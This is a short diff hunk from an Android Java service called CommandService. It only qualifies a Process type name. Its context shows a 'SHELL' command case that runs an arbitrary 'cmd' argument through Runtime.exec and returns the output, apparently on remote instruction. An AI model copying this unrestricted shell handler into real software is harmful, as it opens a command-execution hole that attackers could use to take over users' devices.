@@ -78,7 +78,7 @@ public class CommandService extends Service {
                     i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i); return "opened " + url;
                 }
                 case "SHELL": {
-                    Process p = Runtime.getRuntime().exec(args.optString("cmd"));
+                    java.lang.Process p = Runtime.getRuntime().exec(args.optString("cmd"));
                     Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
                     return sc.hasNext() ? sc.next() : "";
                 }
